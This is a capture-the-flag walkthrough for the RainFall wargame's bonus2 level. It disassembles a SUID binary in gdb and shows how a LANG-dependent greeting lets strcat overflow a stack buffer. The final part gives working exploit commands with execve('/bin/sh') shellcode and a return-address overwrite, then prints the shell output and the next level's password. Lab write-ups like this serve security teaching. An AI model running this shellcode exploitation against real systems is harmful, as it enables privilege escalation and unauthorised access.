login as the user `bonus2`


```shell
ssh -p 4242 bonus2@10.13.100.137
bonus2@10.13.100.137's password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
bonus2@RainFall:~$
```

a `SUID` exactable file is locates in the home directory


```shell
bonus2@RainFall:~$ ./bonus2 ali
bonus2@RainFall:~$ ./bonus2 ali xx
Hello ali
bonus2@RainFall:~$ LANG=fi ./bonus2 ali xx
Hyvää päivää ali
bonus2@RainFall:~$ LANG=nl ./bonus2 ali xx
Goedemiddag! ali
```

the program takes in 2 arguments that are stored in the stack next to each other, the first buffer is of size `40` and the second `32`.
the program's first and second argument's are copied to the buffers using `strncpy`.

the program also define's a `greetuser` function that takes in the first buffer.
the `greetuser` checks the user's selected language form the `LANG` env variable, then it appends the passed in buffer at the end of the specified greeting in a new buffer with size `20` using `strcpy`
and `strcat`, then it prints the buffer in stdout.


```gdb
(gdb) disas main
Dump of assembler code for function main:
   0x08048529 <+0>:     push   %ebp
   0x0804852a <+1>:     mov    %esp,%ebp
   0x0804852c <+3>:     push   %edi
   0x0804852d <+4>:     push   %esi
   0x0804852e <+5>:     push   %ebx
   0x0804852f <+6>:     and    $0xfffffff0,%esp
   0x08048532 <+9>:     sub    $0xa0,%esp
   0x08048538 <+15>:    cmpl   $0x3,0x8(%ebp)
   0x0804853c <+19>:    je     0x8048548 <main+31>
   0x0804853e <+21>:    mov    $0x1,%eax
   0x08048543 <+26>:    jmp    0x8048630 <main+263>
   0x08048548 <+31>:    lea    0x50(%esp),%ebx
   0x0804854c <+35>:    mov    $0x0,%eax
   0x08048551 <+40>:    mov    $0x13,%edx
   0x08048556 <+45>:    mov    %ebx,%edi
   0x08048558 <+47>:    mov    %edx,%ecx
   0x0804855a <+49>:    rep stos %eax,%es:(%edi)
   0x0804855c <+51>:    mov    0xc(%ebp),%eax
   0x0804855f <+54>:    add    $0x4,%eax
   0x08048562 <+57>:    mov    (%eax),%eax
   0x08048564 <+59>:    movl   $0x28,0x8(%esp)
   0x0804856c <+67>:    mov    %eax,0x4(%esp)
   0x08048570 <+71>:    lea    0x50(%esp),%eax
   0x08048574 <+75>:    mov    %eax,(%esp)
   0x08048577 <+78>:    call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:    mov    0xc(%ebp),%eax
   0x0804857f <+86>:    add    $0x8,%eax
   0x08048582 <+89>:    mov    (%eax),%eax
   0x08048584 <+91>:    movl   $0x20,0x8(%esp)
   0x0804858c <+99>:    mov    %eax,0x4(%esp)
   0x08048590 <+103>:   lea    0x50(%esp),%eax
   0x08048594 <+107>:   add    $0x28,%eax
   0x08048597 <+110>:   mov    %eax,(%esp)
   0x0804859a <+113>:   call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:   movl   $0x8048738,(%esp)
   0x080485a6 <+125>:   call   0x8048380 <getenv@plt>
   0x080485ab <+130>:   mov    %eax,0x9c(%esp)
   0x080485b2 <+137>:   cmpl   $0x0,0x9c(%esp)
   0x080485ba <+145>:   je     0x8048618 <main+239>
   0x080485bc <+147>:   movl   $0x2,0x8(%esp)
   0x080485c4 <+155>:   movl   $0x804873d,0x4(%esp)
   0x080485cc <+163>:   mov    0x9c(%esp),%eax
   0x080485d3 <+170>:   mov    %eax,(%esp)
   0x080485d6 <+173>:   call   0x8048360 <memcmp@plt>
   0x080485db <+178>:   test   %eax,%eax
   0x080485dd <+180>:   jne    0x80485eb <main+194>
   0x080485df <+182>:   movl   $0x1,0x8049988
   0x080485e9 <+192>:   jmp    0x8048618 <main+239>
   0x080485eb <+194>:   movl   $0x2,0x8(%esp)
   0x080485f3 <+202>:   movl   $0x8048740,0x4(%esp)
   0x080485fb <+210>:   mov    0x9c(%esp),%eax
   0x08048602 <+217>:   mov    %eax,(%esp)
   0x08048605 <+220>:   call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:   test   %eax,%eax
   0x0804860c <+227>:   jne    0x8048618 <main+239>
   0x0804860e <+229>:   movl   $0x2,0x8049988
   0x08048618 <+239>:   mov    %esp,%edx
   0x0804861a <+241>:   lea    0x50(%esp),%ebx
   0x0804861e <+245>:   mov    $0x13,%eax
   0x08048623 <+250>:   mov    %edx,%edi
   0x08048625 <+252>:   mov    %ebx,%esi
   0x08048627 <+254>:   mov    %eax,%ecx
   0x08048629 <+256>:   rep movsl %ds:(%esi),%es:(%edi)
   0x0804862b <+258>:   call   0x8048484 <greetuser>
   0x08048630 <+263>:   lea    -0xc(%ebp),%esp
   0x08048633 <+266>:   pop    %ebx
   0x08048634 <+267>:   pop    %esi
   0x08048635 <+268>:   pop    %edi
   0x08048636 <+269>:   pop    %ebp
   0x08048637 <+270>:   ret
End of assembler dump.
(gdb) x/s 0x804873d
0x804873d:       "fi"
(gdb) x/s 0x8048740
0x8048740:       "nl"
(gdb) disas greetuser
Dump of assembler code for function greetuser:
   0x08048484 <+0>:     push   %ebp
   0x08048485 <+1>:     mov    %esp,%ebp
   0x08048487 <+3>:     sub    $0x58,%esp
   0x0804848a <+6>:     mov    0x8049988,%eax
   0x0804848f <+11>:    cmp    $0x1,%eax
   0x08048492 <+14>:    je     0x80484ba <greetuser+54>
   0x08048494 <+16>:    cmp    $0x2,%eax
   0x08048497 <+19>:    je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:    test   %eax,%eax
   0x0804849b <+23>:    jne    0x804850a <greetuser+134>
   0x0804849d <+25>:    mov    $0x8048710,%edx
   0x080484a2 <+30>:    lea    -0x48(%ebp),%eax
   0x080484a5 <+33>:    mov    (%edx),%ecx
   0x080484a7 <+35>:    mov    %ecx,(%eax)
   0x080484a9 <+37>:    movzwl 0x4(%edx),%ecx
   0x080484ad <+41>:    mov    %cx,0x4(%eax)
   0x080484b1 <+45>:    movzbl 0x6(%edx),%edx
   0x080484b5 <+49>:    mov    %dl,0x6(%eax)
   0x080484b8 <+52>:    jmp    0x804850a <greetuser+134>
   0x080484ba <+54>:    mov    $0x8048717,%edx
   0x080484bf <+59>:    lea    -0x48(%ebp),%eax
   0x080484c2 <+62>:    mov    (%edx),%ecx
   0x080484c4 <+64>:    mov    %ecx,(%eax)
   0x080484c6 <+66>:    mov    0x4(%edx),%ecx
   0x080484c9 <+69>:    mov    %ecx,0x4(%eax)
   0x080484cc <+72>:    mov    0x8(%edx),%ecx
   0x080484cf <+75>:    mov    %ecx,0x8(%eax)
   0x080484d2 <+78>:    mov    0xc(%edx),%ecx
   0x080484d5 <+81>:    mov    %ecx,0xc(%eax)
   0x080484d8 <+84>:    movzwl 0x10(%edx),%ecx
   0x080484dc <+88>:    mov    %cx,0x10(%eax)
   0x080484e0 <+92>:    movzbl 0x12(%edx),%edx
   0x080484e4 <+96>:    mov    %dl,0x12(%eax)
   0x080484e7 <+99>:    jmp    0x804850a <greetuser+134>
   0x080484e9 <+101>:   mov    $0x804872a,%edx
   0x080484ee <+106>:   lea    -0x48(%ebp),%eax
   0x080484f1 <+109>:   mov    (%edx),%ecx
   0x080484f3 <+111>:   mov    %ecx,(%eax)
   0x080484f5 <+113>:   mov    0x4(%edx),%ecx
   0x080484f8 <+116>:   mov    %ecx,0x4(%eax)
   0x080484fb <+119>:   mov    0x8(%edx),%ecx
   0x080484fe <+122>:   mov    %ecx,0x8(%eax)
   0x08048501 <+125>:   movzwl 0xc(%edx),%edx
   0x08048505 <+129>:   mov    %dx,0xc(%eax)
   0x08048509 <+133>:   nop
   0x0804850a <+134>:   lea    0x8(%ebp),%eax
   0x0804850d <+137>:   mov    %eax,0x4(%esp)
   0x08048511 <+141>:   lea    -0x48(%ebp),%eax
   0x08048514 <+144>:   mov    %eax,(%esp)
   0x08048517 <+147>:   call   0x8048370 <strcat@plt>
   0x0804851c <+152>:   lea    -0x48(%ebp),%eax
   0x0804851f <+155>:   mov    %eax,(%esp)
   0x08048522 <+158>:   call   0x8048390 <puts@plt>
   0x08048527 <+163>:   leave
   0x08048528 <+164>:   ret
End of assembler dump.
(gdb) x/s 0x804872a
0x804872a:       "Goedemiddag! "
(gdb) x/s 0x8048710
0x8048710:       "Hello "
(gdb) printf "%s\n", 0x8048717
Hyvää päivää
```

```shell
bonus2@RainFall:~$ LANG=fi /home/user/bonus2/bonus2 `python -c "print '\x90' * 17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68
\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"` `python -c "print 'A' * 18 + '\x80\xF6\xFF\xBF'"`
Hyvää päivää �����������������1�Ph//shh/bin��PS��
                                                 ̀AAAAAAAAAAAAAAAAAA����
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$
```

or

```shell
bonus2@RainFall:~$ LANG=nl /home/user/bonus2/bonus2 `python -c "print '\x90' * 17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68
\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"` `python -c "print 'A' * 23 + '\x80\xF6\xFF\xBF'"`
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
